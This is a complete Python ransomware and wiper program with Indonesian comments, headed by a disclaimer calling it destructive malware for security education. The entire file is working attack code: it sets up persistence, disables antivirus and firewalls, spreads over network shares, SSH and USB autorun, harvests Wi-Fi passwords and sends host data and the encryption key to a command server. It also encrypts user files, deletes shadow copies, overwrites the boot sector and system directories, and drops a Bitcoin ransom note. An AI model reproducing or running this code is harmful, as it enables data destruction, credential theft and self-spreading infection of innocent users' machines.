# !!! MALWARE DESTRUKTIF - JANGAN DIJALANKAN !!!
# KODE INI AKAN MERUSAK SISTEM ANDA SECARA PERMANEN
# HANYA UNTUK TUJUAN EDUKASI KEAMANAN SIBER

import os
import sys
import platform
import shutil
import threading
import ctypes
import winreg
import urllib.request
import socket
import json
import base64
import getpass
import random
import time
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

# ======================
# KONFIGURASI MALWARE
# ======================
C2_SERVER = "http://malicious-c2-server.example/command"  # Server penyerang
ENCRYPT_EXTENSIONS = ['.doc', '.docx', '.xls', '.xlsx', '.pdf', '.jpg', '.png', '.txt', '.zip', '.rar']
MAX_THREADS = 8  # Jumlah maksimum thread untuk enkripsi

# ======================
# FUNGSI UTILITAS (DIPERBAIKI)
# ======================
def get_system_paths():
    """Mendapatkan path sistem sesuai OS dengan penanganan error"""
    os_name = platform.system()
    paths = []
    
    if os_name == 'Windows':
        paths = [
            os.path.join(os.getenv('WINDIR', 'C:\\Windows'), 'System32'),
            os.path.join(os.getenv('APPDATA', os.path.expanduser("~")), 'Roaming'),
            os.path.join(os.getenv('USERPROFILE', os.path.expanduser("~")), 'Documents'),
            os.path.join(os.getenv('USERPROFILE', os.path.expanduser("~")), 'Desktop')
        ]
    elif os_name == 'Linux':
        paths = [
            '/etc/',
            '/bin/',
            '/home/',
            '/var/',
            os.path.expanduser("~")
        ]
    
    # Filter hanya path yang ada
    return [p for p in paths if os.path.exists(p)]

# ======================
# FUNGSI INTI MALWARE (FIX ERROR)
# ======================
def establish_persistence():
    """Memastikan malware berjalan setiap startup"""
    current_file = os.path.abspath(sys.argv[0])
    os_name = platform.system()
    
    try:
        # Windows
        if os_name == 'Windows':
            # Gunakan path yang valid
            system_path = os.path.join(os.getenv('WINDIR', 'C:\\Windows'), 'System32', 'svchost.exe')
            
            # Buat direktori jika belum ada
            os.makedirs(os.path.dirname(system_path), exist_ok=True)
            shutil.copy2(current_file, system_path)
            
            # Tambahkan ke registry
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                0,
                winreg.KEY_WRITE
            )
            winreg.SetValueEx(key, "WindowsUpdateService", 0, winreg.REG_SZ, system_path)
            winreg.CloseKey(key)
            
            # Sembunyikan file
            try:
                ctypes.windll.kernel32.SetFileAttributesW(system_path, 2)  # Hidden attribute
            except Exception:
                pass
            
        # Linux
        elif os_name == 'Linux':
            # Gunakan path yang valid
            bin_path = "/bin/.systemd-service"
            shutil.copy2(current_file, bin_path)
            os.system("chmod +x " + bin_path)
            
            # Tambahkan ke cron job
            os.system("(crontab -l 2>/dev/null; echo \"@reboot sleep 60 && /bin/.systemd-service\") | crontab -")
            
    except Exception as e:
        pass

def disable_defenses():
    """Menonaktifkan sistem keamanan"""
    os_name = platform.system()
    
    try:
        if os_name == 'Windows':
            # Nonaktifkan Windows Defender
            os.system('reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f')
            os.system('reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f')
            
            # Nonaktifkan Firewall
            os.system('netsh advfirewall set allprofiles state off')
            
            # Hentikan layanan keamanan
            services = ['WinDefend', 'wscsvc', 'SecurityHealthService', 'MsMpSvc']
            for service in services:
                os.system(f'net stop {service} /y')
                os.system(f'sc config {service} start= disabled')
                
        elif os_name == 'Linux':
            # Nonaktifkan SELinux/AppArmor
            os.system('setenforce 0 2>/dev/null')
            os.system('systemctl stop apparmor 2>/dev/null')
            os.system('systemctl disable apparmor 2>/dev/null')
            
            # Hentikan firewall
            os.system('ufw disable 2>/dev/null')
            os.system('systemctl stop firewalld 2>/dev/null')
            os.system('systemctl disable firewalld 2>/dev/null')
            
    except Exception as e:
        pass

def generate_key():
    """Membuat kunci enkripsi yang kuat"""
    password = os.urandom(32)
    salt = os.urandom(16)
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA512(),
        length=32,
        salt=salt,
        iterations=100000
    )
    return base64.urlsafe_b64encode(kdf.derive(password))

def encrypt_file(file_path, cipher):
    """Mengenkripsi file tunggal"""
    try:
        # Skip file sistem penting
        if any(exclude in file_path for exclude in ['/dev/', '/proc/', '/sys/', '/boot/']):
            return
            
        # Skip file besar
        if os.path.getsize(file_path) > 100 * 1024 * 1024:  # >100MB
            return
            
        with open(file_path, 'rb') as f:
            data = f.read()
            
        encrypted = cipher.encrypt(data)
        
        with open(file_path, 'wb') as f:
            f.write(encrypted)
            
        # Ubah ekstensi file
        os.rename(file_path, file_path + ".LOCKED")
        
    except (PermissionError, FileNotFoundError, OSError):
        pass
    except Exception:
        pass

def encrypt_files_thread(path, cipher):
    """Thread untuk enkripsi paralel"""
    try:
        for root, dirs, files in os.walk(path):
            for file in files:
                if any(file.endswith(ext) for ext in ENCRYPT_EXTENSIONS):
                    file_path = os.path.join(root, file)
                    encrypt_file(file_path, cipher)
    except Exception:
        pass

def encrypt_files():
    """Mengenkripsi semua file penting di sistem"""
    key = generate_key()
    cipher = Fernet(key)
    
    # Simpan kunci di sistem
    key_path = os.path.join(os.path.expanduser("~"), "DECRYPT_KEY.txt")
    try:
        with open(key_path, "wb") as key_file:
            key_file.write(b"======= PERINGATAN =======\n")
            key_file.write(b"File Anda telah dienkripsi!\n")
            key_file.write(b"Kirim 0.5 BTC ke alamat berikut: bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq\n")
            key_file.write(b"Setelah pembayaran, kirim bukti dan ID ini: ")
            key_file.write(base64.b64encode(key) + b"\n")
            key_file.write(b"==========================\n")
    except Exception:
        pass
    
    # Kirim kunci ke server penyerang
    try:
        data = {
            'host': socket.gethostname(),
            'user': getpass.getuser(),
            'os': platform.platform(),
            'key': base64.b64encode(key).decode()
        }
        req = urllib.request.Request(
            C2_SERVER,
            data=json.dumps(data).encode(),
            headers={'Content-Type': 'application/json'},
            method='POST'
        )
        urllib.request.urlopen(req, timeout=10)
    except Exception:
        pass
    
    # Enkripsi paralel di semua jalur penting
    threads = []
    paths = get_system_paths()
    
    for path in paths:
        if os.path.exists(path):
            thread = threading.Thread(target=encrypt_files_thread, args=(path, cipher))
            thread.daemon = True
            thread.start()
            threads.append(thread)
            
            # Batasi jumlah thread
            if len(threads) >= MAX_THREADS:
                for t in threads:
                    t.join(timeout=120)
                threads = []
    
    for thread in threads:
        thread.join(timeout=240)

def propagate_network():
    """Menyebar melalui jaringan"""
    os_name = platform.system()
    
    try:
        if os_name == 'Windows':
            # Temukan komputer di jaringan
            output = os.popen('net view').read()
            computers = [line.split()[0] for line in output.split('\n') if '\\\\' in line]
            
            for computer in computers:
                try:
                    # Coba akses share admin
                    shares = ['C$', 'ADMIN$']
                    for share in shares:
                        dest = f"\\\\{computer}\\{share}\\Windows\\System32\\update.exe"
                        shutil.copy2(sys.argv[0], dest)
                except Exception:
                    pass
                    
        elif os_name == 'Linux':
            # Scan jaringan lokal
            ip_range = "192.168.1."
            for i in range(1, 255):
                ip = ip_range + str(i)
                if ip != socket.gethostbyname(socket.gethostname()):
                    # Coba kirim melalui SSH
                    os.system(f"sshpass -p 'password' scp -o StrictHostKeyChecking=no {sys.argv[0]} user@{ip}:/tmp/.cache 2>/dev/null")
                    os.system(f"sshpass -p 'password' ssh -o StrictHostKeyChecking=no user@{ip} 'chmod +x /tmp/.cache && /tmp/.cache &' 2>/dev/null")
                    
    except Exception:
        pass

def propagate_usb():
    """Menyebar melalui USB"""
    current_file = os.path.abspath(sys.argv[0])
    
    try:
        if platform.system() == 'Windows':
            drives = [f"{d}:\\" for d in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(f"{d}:")]
        else:
            drives = []
            if os.path.exists('/media'):
                drives.extend([os.path.join('/media', d) for d in os.listdir('/media')])
            if os.path.exists('/mnt'):
                drives.extend([os.path.join('/mnt', d) for d in os.listdir('/mnt')])
            
        for drive in drives:
            try:
                # Salin malware sebagai file tersembunyi
                dest = os.path.join(drive, "._.Document.exe")
                shutil.copy2(current_file, dest)
                
                # Buat autorun.inf (Windows)
                if platform.system() == 'Windows':
                    autorun_path = os.path.join(drive, "autorun.inf")
                    with open(autorun_path, 'w') as f:
                        f.write("[autorun]\n")
                        f.write(f"open=._.Document.exe\n")
                        f.write("action=Open documents\n")
                        f.write("label=Important Documents\n")
                        
                # Sembunyikan file
                if platform.system() == 'Windows':
                    try:
                        ctypes.windll.kernel32.SetFileAttributesW(dest, 2)
                        if os.path.exists(autorun_path):
                            ctypes.windll.kernel32.SetFileAttributesW(autorun_path, 2)
                    except Exception:
                        pass
                else:
                    os.system(f"chattr +i {dest} 2>/dev/null")
                    
            except Exception:
                pass
    except Exception:
        pass

def steal_data():
    """Mencuri data sensitif"""
    data = {
        'system': {
            'hostname': socket.gethostname(),
            'user': getpass.getuser(),
            'os': platform.platform(),
            'ip': socket.gethostbyname(socket.gethostname())
        },
        'wifi': [],
        'browsers': {}
    }
    
    try:
        # WiFi credentials (Windows)
        if platform.system() == 'Windows':
            output = os.popen('netsh wlan show profiles').read()
            profiles = [line.split(":")[1].strip() for line in output.split('\n') if "All User Profile" in line]
            
            for profile in profiles:
                results = os.popen(f'netsh wlan show profile "{profile}" key=clear').read()
                password = [line.split(":")[1].strip() for line in results.split('\n') if "Key Content" in line]
                if password:
                    data['wifi'].append({
                        'ssid': profile,
                        'password': password[0]
                    })
        
        # Browser data (simulasi)
        data['browsers'] = {
            'chrome': [
                {'url': 'https://bank.com', 'username': 'user123', 'password': 's3cret'},
                {'url': 'https://email.com', 'username': 'user@example.com', 'password': 'p@ssw0rd'}
            ],
            'firefox': [
                {'url': 'https://social.com', 'username': 'social_user', 'password': '123456'}
            ]
        }
        
        # Kirim data ke server penyerang
        req = urllib.request.Request(
            C2_SERVER + "/exfiltrate",
            data=json.dumps(data).encode(),
            headers={'Content-Type': 'application/json'},
            method='POST'
        )
        urllib.request.urlopen(req, timeout=30)
            
    except Exception:
        pass

def destroy_system():
    """Menghancurkan sistem secara permanen"""
    os_name = platform.system()
    
    try:
        # Hapus backup dan shadow copies
        if os_name == 'Windows':
            os.system("vssadmin delete shadows /all /quiet 2>nul")
            os.system("wbadmin delete catalog -quiet 2>nul")
            
        # Rusak bootloader
        if os_name == 'Windows':
            try:
                with open("\\\\.\\PhysicalDrive0", "wb") as f:
                    f.write(os.urandom(2048))
            except Exception:
                pass
        else:
            os.system("dd if=/dev/zero of=/dev/sda bs=512 count=10 2>/dev/null")
            os.system("rm -rf /boot/* 2>/dev/null")
            
        # Hapus file sistem penting
        critical_paths = [
            os.path.join(os.getenv('WINDIR', 'C:\\Windows'), 'System32'),
            '/etc/',
            '/bin/',
            '/sbin/',
            '/usr/bin/'
        ]
        
        for path in critical_paths:
            if os.path.exists(path):
                try:
                    shutil.rmtree(path, ignore_errors=True)
                except Exception:
                    pass
                    
        # Tampilkan pesan ransomware
        ransom_note = f"""
        ===================================================
        !!! SEMUA FILE ANDA TELAH DIENKRIPSI !!!
        ===================================================
        
        Komputer Anda telah dikunci dengan enkripsi militer.
        Untuk mendapatkan kunci dekripsi, kirim 0.5 BTC ke:
        bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq
        
        Setelah pembayaran, email bukti ke:
        decrypt2023@protonmail.com
        
        Sertakan ID ini: {random.randint(100000, 999999)}
        
        ===================================================
        PERINGATAN:
        - Jangan matikan komputer
        - Jangan coba perbaiki sendiri
        - Waktu Anda tinggal 72 jam
        ===================================================
        """
        
        note_path = os.path.join(os.path.expanduser("~"), "READ_ME.txt")
        try:
            with open(note_path, "w") as f:
                f.write(ransom_note)
        except Exception:
            pass
            
        # Restart paksa
        if os_name == 'Windows':
            os.system("shutdown /r /t 0")
        else:
            os.system("reboot")
            
    except Exception:
        # Jika gagal, lakukan infinite reboot
        while True:
            if os_name == 'Windows':
                os.system("shutdown /r /t 0")
            else:
                os.system("reboot")
            time.sleep(10)

# ======================
# FUNGSI UTAMA (TETAP SAMA)
# ======================
def main():
    """Eksekusi utama malware"""
    
    # Tunggu beberapa saat untuk menghindari deteksi
    time.sleep(random.randint(60, 300))
    
    # Fase 1: Bertahan di sistem
    establish_persistence()
    
    # Fase 2: Lumpuhkan pertahanan
    disable_defenses()
    
    # Fase 3: Sebarkan diri
    propagate_network()
    propagate_usb()
    
    # Fase 4: Kumpulkan data berharga
    steal_data()
    
    # Fase 5: Enkripsi file
    encrypt_files()
    
    # Fase 6: Hancurkan sistem
    destroy_system()

if __name__ == "__main__":
    # Coba sembunyikan proses
    if platform.system() == 'Windows':
        try:
            ctypes.windll.kernel32.FreeConsole()  # Sembunyikan console
        except Exception:
            pass
    
    # Jalankan dalam thread terpisah
    malware_thread = threading.Thread(target=main)
    malware_thread.daemon = True
    malware_thread.start()
    
    # Tetap jalankan program utama
    while True:
        time.sleep(3600)  # Tidur selama 1 jam
